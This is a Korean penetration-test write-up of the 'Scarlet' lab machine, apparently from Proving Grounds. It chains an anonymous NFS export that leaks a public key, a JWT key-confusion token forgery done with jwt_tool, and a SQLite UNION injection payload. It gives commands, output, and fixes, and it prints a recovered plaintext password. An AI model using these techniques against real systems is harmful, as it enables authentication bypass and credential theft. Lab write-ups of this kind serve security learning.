---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/nfs
  - tech/web/sqli
  - tech/web/jwt
  - tech/crypto/known-plaintext
  - tech/cred/reuse
  - tech/exec/ssh-key
type: machine
platform: pg
os: linux
ip: 192.168.248.222
domain: scarlet.local
ports: [22, 80, 111, 2049, 33527, 41543, 53291, 53845, 59493]
services: [http, mountd, nfs_acl, nlockmgr, rpcbind, ssh, status]
status: solved
manual_tags: true
manual_cves: true
tech_count: 6
---

> [!info] 요약
> 타겟 `192.168.248.222` (`scarlet.local`) · Ubuntu 22.04 LTS (5.15.0-41-generic) · Intermediate · 플래그 2개
> 진입점: 익명 NFS export `/mnt/share` 에서 RSA `public.key` 회수 → Express 앱의 JWT RS256↔HS256 키 혼동으로 세션 토큰 위조 → 위조 토큰의 `username` 클레임에 SQLite UNION 인젝션 → `brian:Standingbytheseaside12` → SSH
> 권한상승: `/opt/backup.zip`(ZipCrypto)을 **동일한 `public.key` 를 known-plaintext 로 삼아** bkcrack 으로 복호화 → 내부의 `root@scarlet` SSH 개인키 → `ssh -i` 로 root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.222

### Initial Access – 익명 NFS export 에서 주운 공개키 한 장이 JWT 위조와 SQL 인젝션을 차례로 여는 체인

**Vulnerability Explanation:** 세 결함이 연쇄함.
- NFS export `/mnt/share` 의 호스트 스펙이 `*` — 무인증·무제한 마운트 허용. 셸 없이 파일을 읽는 정보 유출 채널임
- 세션 JWT 검증이 `jwt.verify(token, publicKey, { algorithms: ['RS256','HS256'] })` — **비대칭(RS256)과 대칭(HS256)을 한 화이트리스트에 넣음.** `alg` 를 `HS256` 으로 바꾼 토큰은 그 `publicKey` PEM 문자열을 **HMAC 비밀키로** 검증하므로, 공개키를 가진 쪽이 임의 클레임을 서명 가능 = 키 혼동(key confusion)
- `/portal` 이 토큰의 `username` 클레임을 `getUser()` 에 넘기고, 그 함수만 템플릿 리터럴로 SQL 을 조립함(`WHERE username = '${username}'`) — SQLite 인젝션. 같은 파일의 `checkUser`·`attemptLogin`·`createUser` 는 플레이스홀더를 쓰므로 **한 함수만 빠진 형태**임

**Vulnerability Fix:**
- `/etc/exports` 의 `*` 를 CIDR·호스트명으로 제한하고 `ro` 로 낮출 것. 애플리케이션 키 자료를 export 디렉터리에 두지 말 것
- `algorithms` 화이트리스트에서 `HS256` 을 제거해 `['RS256']` 만 둘 것. 검증용 공개키와 서명용 개인키가 같은 인자 자리로 흐르지 않게 분리
- `getUser()` 를 파라미터 바인딩으로 전환 — `db.get("SELECT * FROM users WHERE username = ?", username)`. 발급 시점의 따옴표 이스케이프는 위조 토큰에 적용되지 않으므로 방어가 못 됨
- 비밀번호를 bcrypt/argon2id 로 저장. 평문이면 덤프가 곧 OS 로그인이 됨
- 존재하지 않는 사용자에 `doesn't exist` 를 돌려주지 말 것(사용자 열거). DB 에러를 응답에 싣지 말 것
- `exp` 클레임을 넣고 서버가 만료를 검사할 것

**Severity:** Critical — 무인증 상태에서 파일 읽기 → 인증 우회 → 자격증명 전량 탈취 → SSH 대화형 셸

**Steps to reproduce the attack:**
1. `showmount -e` 로 `/mnt/share *` 확인 후 `mount -t nfs` → `essentials/public.key` 회수
2. `/login` 에 폼 인코딩으로 로그인해 `session` 쿠키(JWT, `alg:RS256`) 확보
3. 회수한 공개키를 HMAC 비밀키로 삼아 `alg:HS256` 토큰 재서명 → `/portal` 이 200 응답
4. `username` 클레임에 후보 계정명을 순회, `doesn't exist` 유무로 유효 계정 `brian` 확정
5. 같은 클레임에 `'` 주입 → `SQLITE_ERROR` 로 인젝션 확정
6. `UNION SELECT group_concat(username||':'||password,'  '),2,3 FROM users` 로 덤프 → `brian:Standingbytheseaside12`
7. 같은 비밀번호로 `ssh brian@192.168.248.222`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.222 | TCP: 22, 80, 111, 2049, 33527, 41543, 53291, 53845, 59493 |

```text
# Nmap 7.98 scan initiated Wed Aug 19 12:56:33 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.222
Nmap scan report for 192.168.248.222
Host is up (0.085s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp    open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      53845/tcp   mountd
|   100005  1,2,3      58558/udp   mountd
|   100021  1,3,4      32877/udp   nlockmgr
|   100021  1,3,4      33527/tcp   nlockmgr
|   100024  1          39417/udp   status
|   100024  1          41543/tcp   status
|_  100227  3           2049/tcp   nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
33527/tcp open  nlockmgr 1-4 (RPC #100021)
41543/tcp open  status   1 (RPC #100024)
53291/tcp open  mountd   1-3 (RPC #100005)
53845/tcp open  mountd   1-3 (RPC #100005)
59493/tcp open  mountd   1-3 (RPC #100005)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   84.39 ms 192.168.45.1
2   84.35 ms 192.168.45.254
3   85.18 ms 192.168.251.1
4   85.35 ms 192.168.248.222

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 19 12:57:01 2026 -- 1 IP address (1 host up) scanned in 27.54 seconds
```
— 출처: `~/PG/Scarlet/nmap.log`. 실행은 쌀 별칭 `nnmap 192.168.248.222`(`~/.zsh_history`)이고, 로그 첫 줄이 그 별칭의 실체(`-sCV -p- -Pn -A --min-rate 5000`)를 확정함 — 이전 판 노트가 `[가정]` 으로 남겨둔 부분임

**버전 판정 독립 근거 2개.** ① nmap 서비스 지문 — `OpenSSH 8.9p1 Ubuntu 3` · `nginx 1.18.0 (Ubuntu)`. ② 셸 획득 후 SSH MOTD 배너 — `Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)`. 두 출처가 Ubuntu 22.04 로 일치함.

**RPC 포트 매핑도 독립 근거 2개로 확인함** — nmap 의 `rpcinfo` NSE 결과와 직접 친 `rpcinfo -p` 를 대조.

```bash
┌──(kali㉿kali)-[~/PG]
└─$ rpcinfo -p 192.168.248.222
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  46813  mountd
    100005    1   tcp  53291  mountd
    100005    2   udp  36537  mountd
    100005    2   tcp  59493  mountd
    100005    3   udp  58558  mountd
    100005    3   tcp  53845  mountd
    100024    1   udp  39417  status
    100024    1   tcp  41543  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  32877  nlockmgr
    100021    3   udp  32877  nlockmgr
    100021    4   udp  32877  nlockmgr
    100021    1   tcp  33527  nlockmgr
    100021    3   tcp  33527  nlockmgr
    100021    4   tcp  33527  nlockmgr
```
UDP 쪽도 같이 확인함(내용은 위와 동일한 매핑이라 중략).

```bash
rpcinfo -T udp 192.168.248.222
   program version netid     address                service    owner
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    ... (중략) ...
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser
    100021    1    udp       0.0.0.0.128.109        nlockmgr   superuser
    ... (중략) ...
    100021    4    tcp       0.0.0.0.130.247        nlockmgr   superuser
```

`0.0.0.0.8.1` 은 **universal address** 표기임 — 마지막 두 옥텔이 포트의 상위/하위 바이트다. `8.1` = `8*256 + 1` = 2049, `130.247` = 33527.

`100003` 두 줄 — **nfs v3 과 v4 가 모두 살아 있음.** `showmount -e` 는 NFSv3 의 mountd 프로토콜에만 답하므로, v4 전용 서버였다면 빈 결과가 나오고 `mount -t nfs4 <ip>:/` 로 의사 루트를 잡아야 함.

`showmount` 는 111 portmapper 에 물어 mountd 의 현재 포트를 런타임에 받는다. **mountd 가 고번호 포트(53291·53845·59493)에 흩어져 있는 것은 `-p-` 가 필요한 이유가 아님** — 111·2049 는 nmap top-1000 에 있어 기본 스캔만으로도 NFS 열거는 온전함.

**웹 — IP 로 치면 66바이트짜리 빈 페이지뿐.**

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ feroxbuster -u http://192.168.248.222/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100
 ... (배너 중략) ...
 🎯  Target Url            │ http://192.168.248.222/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💲  Extensions            │ [php, txt, html, bak, zip]
 🔃  Recursion Depth       │ 4
────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w       66c http://192.168.248.222/
200      GET        1l        1w       66c http://192.168.248.222/index.html
[####################] - 3m    180000/180000  0s      found:2       errors:0
[####################] - 3m    180000/180000  1138/s  http://192.168.248.222/     
```

66바이트 · 1줄 1단어 · nmap 이 `http-title` 을 못 뽑음 — 세 신호가 전부 vhost 를 가리킴. `/etc/hosts` 에 호스트명을 박고 같은 스캔을 다시 돌림.

```bash
┌──(kali㉿kali)-[~/PG]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouter
240.0.0.1  nagoya.nagoya-industries.com
192.168.248.222 scarlet.local
```

`[가정]` **`scarlet.local` 을 어떻게 특정했는지는 기록이 없음.** 박스 이름 + `.local` 관례로 찍은 것으로 보임. `~/.zsh_history` 에는 `sudo vi /etc/hosts` 만 남고 그 앞에 도메인을 캐낸 명령이 없음. (사후 확인: 복호화한 백업의 nginx 설정 `web/scarlet.local` 이 `server_name scarlet.local;` 로 이 호스트명을 확정하나, 이는 침투 «후» 얻은 근거임.)

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ feroxbuster -u http://scarlet.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100
 ... (배너·설정 중략) ...
────────────────────────────────────────────────
404      GET        1l        4w       27c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        4w       28c http://scarlet.local/logout => http://scarlet.local/login
301      GET       10l       16w      173c http://scarlet.local/css => http://scarlet.local/css/
200      GET        7l       74w     4617c http://scarlet.local/assets/bootstrap/css/bootstrap-reboot.min.css
301      GET       10l       16w      179c http://scarlet.local/assets => http://scarlet.local/assets/
200      GET      304l     1677w   138148c http://scarlet.local/assets/images/mbr-3.jpeg
302      GET        1l        4w       28c http://scarlet.local/portal => http://scarlet.local/login
200      GET      570l     3113w   280183c http://scarlet.local/assets/images/mbr.png
200      GET      934l     1582w    15529c http://scarlet.local/assets/socicon/css/styles.css
200      GET        6l     1919w   155585c http://scarlet.local/assets/bootstrap/css/bootstrap.min.css
200      GET       15l       35w      321c http://scarlet.local/assets/parallax/jarallax.css
200      GET      961l     1708w    14947c http://scarlet.local/assets/theme/css/style.css
200      GET      191l      409w     3817c http://scarlet.local/css/style.css
200      GET       94l      237w     3830c http://scarlet.local/login
200      GET      265l      748w     7945c http://scarlet.local/assets/dropdown/css/style.css
200      GET      498l      850w     8709c http://scarlet.local/assets/web/assets/mobirise-icons2/mobirise2.css
200      GET       94l      237w     3830c http://scarlet.local/Login
200      GET     1746l     4268w    42320c http://scarlet.local/assets/mobirise/css/mbr-additional.css
200      GET        6l      309w    51452c http://scarlet.local/assets/bootstrap/css/bootstrap-grid.min.css
301      GET       10l       16w      193c http://scarlet.local/assets/images => http://scarlet.local/assets/images/
200      GET      459l     2379w   190079c http://scarlet.local/assets/images/mbr-2.jpg
200      GET      880l     5197w   381436c http://scarlet.local/assets/images/mbr-10.jpg
301      GET       10l       16w      187c http://scarlet.local/assets/web => http://scarlet.local/assets/web/
200      GET     1316l     7711w   584073c http://scarlet.local/assets/images/mbr-9.jpg
200      GET      924l     5182w   590321c http://scarlet.local/assets/images/mbr-6.jpg
200      GET     2678l    14443w   831460c http://scarlet.local/assets/images/ali-morshedlou-wmd64tmfc4k-unsplash.jpg
301      GET       10l       16w      201c http://scarlet.local/assets/web/assets => http://scarlet.local/assets/web/assets/
301      GET       10l       16w      177c http://scarlet.local/views => http://scarlet.local/views/
301      GET       10l       16w      191c http://scarlet.local/assets/theme => http://scarlet.local/assets/theme/
200      GET     1484l     8955w   901311c http://scarlet.local/assets/images/dan-cornilov-ehuyu820lca-unsplash.jpg
200      GET     1086l     9298w   900460c http://scarlet.local/assets/images/linkedin-sales-solutions-pata8xe-ivm-unsplash.jpg
200      GET      405l     1254w    20445c http://scarlet.local/
200      GET      102l      285w     4294c http://scarlet.local/views/login.html
301      GET       10l       16w      199c http://scarlet.local/assets/theme/css => http://scarlet.local/assets/theme/css/
301      GET       10l       16w      197c http://scarlet.local/assets/theme/js => http://scarlet.local/assets/theme/js/
200      GET      405l     1254w    20445c http://scarlet.local/views/index.html
200      GET      109l      350w     6084c http://scarlet.local/views/portal.html
301      GET       10l       16w      181c http://scarlet.local/helpers => http://scarlet.local/helpers/
302      GET        1l        4w       28c http://scarlet.local/Portal => http://scarlet.local/login
302      GET        1l        4w       28c http://scarlet.local/Logout => http://scarlet.local/login
301      GET       10l       16w      197c http://scarlet.local/assets/dropdown => http://scarlet.local/assets/dropdown/
301      GET       10l       16w      203c http://scarlet.local/assets/dropdown/js => http://scarlet.local/assets/dropdown/js/
301      GET       10l       16w      205c http://scarlet.local/assets/dropdown/css => http://scarlet.local/assets/dropdown/css/
301      GET       10l       16w      179c http://scarlet.local/routes => http://scarlet.local/routes/
301      GET       10l       16w      187c http://scarlet.local/middleware => http://scarlet.local/middleware/
302      GET        1l        4w       28c http://scarlet.local/PORTAL => http://scarlet.local/login
[####################] - 6m   2880792/2880792 0s      found:45      errors:380474
```
같은 워드리스트·같은 옵션인데 2건이 45건이 됨.

읽어야 할 줄은 다섯.

| 발견 | 무엇을 뜻하는가 |
|---|---|
| `/views/`·`/routes/`·`/helpers/`·`/middleware/` | Express(Node.js) 표준 디렉터리 구조. PHP 가 아니므로 `.php` 확장자 브루트는 낭비 |
| `/portal` → 302 → `/login` | 인증 게이트가 걸린 목표 페이지 |
| `/views/portal.html` 이 200 | 라우터를 거치지 않는 정적 템플릿 노출. 포털이 무엇을 렌더하는지 미리 보임 |
| `/Login`·`/Portal`·`/PORTAL` 이 전부 응답 | Express 의 `case sensitive routing` 은 기본이 비활성. 설정한 결과가 아니라 아무것도 안 한 결과이고, 45건 중 상당수가 중복이라는 뜻 |
| `errors:380474` | 재귀 4단계 + `-t 100` 으로 단일 프로세스 Node 앱을 두들겨 타임아웃 대량 발생. **「스캔 완료」가 아니라 「상당수 미확인」** |

**NFS export 목록은 30초면 나옴.**

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ showmount -e 192.168.248.222
Export list for 192.168.248.222:
/mnt/share *
```

`*` — 호스트 제한 없음. 이 한 줄이 나온 시점에 웹을 잠시 멈추고 마운트부터 하는 것이 옳음.

### Initial Access – NFS 공개키 → JWT 키 혼동 → SQLite UNION

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ mkdir -p /tmp/nfs

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ sudo mount -t nfs 192.168.248.222:/mnt/share /tmp/nfs -o nolock

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ ls -al /tmp/nfs
total 8
drwxrwxrwx  3 nobody nogroup 4096 Jul 18  2022 .
drwxrwxrwt 26 root   root     580 Aug 19 15:05 ..
drwxr-xr-x  2 root   root    4096 Jul 18  2022 essentials
```

`-o nolock` 은 NLM(파일 잠금)을 끔. lockd 는 별도 포트(33527·32877)를 쓰고 클라이언트로 되돌아오는 콜백 연결을 요구하므로, VPN 환경에서 이것을 빼면 마운트가 수십 초 멈췄다가 실패하는 일이 잦음.

> [!warning] `drwxrwxrwx nobody nogroup` 은 `root_squash` 의 증거가 아님
> `root_squash` 는 클라이언트가 보내는 UID 0 요청을 `anonuid`(기본 65534)로 강등하는 **서버측 접근 통제**이지, 서버에 있는 파일의 표시 소유자를 바꾸는 기능이 아님.
> 반증이 같은 `ls` 출력 안에 있음 — 바로 아랫줄 `essentials` 는 `root root` 로 보인다. 같은 마운트인데 부모만 `nobody` 로 뒤집힐 이유가 없음. 즉 이 표시는 서버측 실제 소유권이고 `/mnt/share` 가 진짜로 `nobody:nogroup` 777 임.
> 판정의 확실한 근거는 `/etc/exports` 뿐이다(`Privilege Escalation` 절에서 확인). 셸 전에 실증하려면 `sudo touch /tmp/nfs/probe && ls -lan /tmp/nfs/probe` 로 기록되는 UID 를 본다 — 0 이면 `no_root_squash`, 65534 면 `root_squash`.

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ cd /tmp/nfs/essentials

┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ ls
public.key

┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ cat public.key
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3dFqq0OaPITIrCHAN86q
GYIbNAJYlyodym1PNrklp0pD0ddhit7omVeVY6JYq+BDHaMgS6mBr20ecAf7oBUA
CAKgnAkZpUtUY0p5JMe5jEUbVVnZylwawiJP8MsU+F+vRf3UDSiJIRAff+rajdxb
dubApQakRdy4HfxMFTUGJEDm91YpjHCpLXslXub5pWZtA+4QeKzWCMO70PwWcEYA
Yv0Gif0yR4hGKm5ugI2KzCT1CbJAE++ZHryR0oMHjFIEPwFjDqdcQk0Z+nuDlmJL
vQdA2Y7O6k7OJLXbRvDH97+L4ouPcxj2gS+x25mlFBmiMZUXnj/ZqD2DGz5Yq+hB
f4DRAALZAv5zsN2uiPjU98IAm4jdqTw+yUxUkdX5bDomPF1jFvdWygsY8Yo5J3pk
xWhMvULam5kfs1Cu+RHR3fu9m7xi7QILkWVyOd8B0qfixtpGE20o6/VhuAS9rPBH
AMih9//ztpKStW0NNhtfYfsl9xenqt1E9GVr3js/OUYIcC4ZOLZT4ulluL0gAGWu
niDUq1os9iR2HzYBNOwlw77bipjACB0mxZE7WE2fQEtLnQ/K5yDQTQM4tr3r8X6L
RTAP0iwG56rcYiQtmM/shSocenRr228os666rQwFnxT7jugl0sRlsFqZNzgXWDn/
51qez+VrhIb63VuDyVKewPcCAwEAAQ==
-----END PUBLIC KEY-----
```

**공개키임. 개인키가 아님.** 여기서 「쓸모없다」고 판단하면 박스가 끝남.

```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ openssl rsa -pubin -in public.key -text -noout | head -3
Public-Key: (4096 bit)
Modulus:
    00:dd:d1:6a:ab:43:9a:3c:84:c8:ac:21:c0:37:ce:
    ┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ ssh-keygen -f public.key -e -m PKCS8 2>/dev/null | head

```

4096비트 RSA 공개키 확정. 두 번째 명령(`ssh-keygen -e`)은 빈 출력으로 실패했으나 결과에 영향 없음 — JWT 키 혼동에 필요한 것은 PEM 파일 **원본 바이트 그대로**라 형식 변환 자체가 불필요한 우회였음.

**로그인 — 두 번째 시도에서 성공.**

```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ curl -i -X POST http://scarlet.local/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 19 Aug 2026 06:10:33 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 69
Connection: keep-alive
X-Powered-By: Express
Location: /login?error=Invalid%20username%20or%20password
Vary: Accept

Found. Redirecting to /login?error=Invalid%20username%20or%20password                                 
```

`X-Powered-By: Express` — Node.js/Express 확정. `/routes/`·`/middleware/` 디렉터리 관측과 일치(독립 근거 2개).

```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ curl -i -X POST http://scarlet.local/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=4leaf&password=password1"
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 19 Aug 2026 06:11:06 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 29
Connection: keep-alive
X-Powered-By: Express
Set-Cookie: session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo; Max-Age=900; Path=/; Expires=Wed, 19 Aug 2026 06:26:06 GMT
Location: /portal
Vary: Accept

Found. Redirecting to /portal      
```

`Location: /portal` — 로그인 성공. 세션 쿠키가 곧 JWT.

> [!warning] `4leaf:password1` 의 출처가 기록에 없음
> `~/.zsh_history` 에 `/login` POST 는 위 두 건뿐이고, 이 자격증명을 어디서 얻었는지 남은 기록이 없음.
> `[가정]` **자가 등록으로 본다.** 근거 둘 — ① `views/login.html` 에 `<input type="submit" name="register" value="Register">` 회원가입 폼이 있고 `POST /login` 이 `req.body.register` 유무로 등록 분기를 탐 ② 백업의 2022년 `database.db` 에는 `brian` 한 행뿐이고 `4leaf` 가 없음(즉 그 이후 생성된 계정). 브라우저 폼으로 등록했다면 `zsh_history` 에 안 남는 것과도 맞음.
> **이전 판 노트의 「SQLi 로 덤프한 users 에 4leaf 가 실재하므로 어딘가에서 읽은 값」이라는 추론은 성립하지 않는다** — 우리가 만든 계정이라면 당연히 실재하기 때문임.

토큰의 앞 두 조각을 디코드하면 재료가 전부 보임.

```bash
echo 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
{"alg":"RS256","typ":"JWT"}

echo 'eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ' | base64 -d
{"username":"4leaf","iat":1787119866}
```

`alg: RS256` + NFS 에서 주운 공개키 — 이 둘이 만나는 순간 키 혼동이 성립. `Max-Age=900`(15분)은 **위조 토큰에 적용되지 않는다** — `exp` 클레임이 없어 서버가 만료를 검사하지 않으므로 `iat=1787119866` 을 계속 재사용해도 통했음.

**키 혼동으로 토큰 위조.**

```bash
┌──(kali㉿kali)-[~/git/jwt_tool]
└─$  python jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo -X k -pk /tmp/nfs/essentials/public.key -T
 ... (배너 중략) ...
/home/kali/.jwt_tool/jwtconf.ini
Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] alg = "RS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] username = "4leaf"
[2] iat = 1787119866    ==> TIMESTAMP = 2026-08-19 15:11:06 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
File loaded: /tmp/nfs/essentials/public.key
jwttool_6cbb3756e7e57b0c3afe455ed7fabbad - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.1t8YpvMp8bRijEzMb_ihIr-pKy2zciVb4jJzUDmUckA
```

| 플래그 | 의미 |
|---|---|
| `-X k` | key confusion 공격. `-X a` 는 `alg:none`, `-X s` 는 서명 제거 |
| `-pk <파일>` | 공개키 파일. 이것이 HMAC 비밀키로 쓰임 |
| `-T` | 대화형 tamper 모드 |
| `-I -pc <키> -pv <값>` | 비대화형 클레임 주입. 스크립트에 넣으려면 이쪽 |

> [!warning] jwt_tool 이 붙인 `(UTC)` 라벨은 실제로는 로컬 시각(KST)임
> `1787119866` 의 UTC 는 `06:11:06` 이고 `15:11:06` 은 KST(UTC+9). 대조 근거가 이 노트 안에 있음 — 그 토큰을 발급한 응답 헤더가 `Date: Wed, 19 Aug 2026 06:11:06 GMT` 다.
> `[가정]` 원인은 파이썬 `datetime.fromtimestamp()`(로컬 변환)를 쓰고 라벨만 `UTC` 로 찍는 것으로 보임. 위 원문 출력은 그대로 보존함 — 도구가 실제로 그렇게 찍은 것이 사실이므로.
> 실전 의미: 토큰 시각을 서버 로그·응답 헤더와 대조할 때 9시간이 어긋난다. `date -u -d @1787119866` 으로 직접 환산할 것.

생성된 토큰의 헤더가 `HS256` 으로 바뀌었음.

```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
{"alg":"HS256","typ":"JWT"}
```

서버가 위조 토큰을 받는지 확인 — `/portal` 이 302 가 아니라 200 이면 성공임.

```bash
┌──(kali㉿kali)-[/tmp/nfs/essentials]
└─$ curl -i http://scarlet.local/portal \
  -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.1t8YpvMp8bRijEzMb_ihIr-pKy2zciVb4jJzUDmUckA"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 19 Aug 2026 06:16:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 6070
Connection: keep-alive
X-Powered-By: Express
ETag: W/"17b6-S2iOoyef+QZxV0gETUqPAzQUxqk"

<!DOCTYPE html>
<html  >
<head>
  <!-- Site made with Mobirise Website Builder v5.6.5, https://mobirise.com -->
 ... (헤드 중략) ...
  <title>Scarlet - Portal</title>
```

**200 OK + `Scarlet - Portal`.** 이 시점부터 `username` 클레임이 완전히 통제됨.

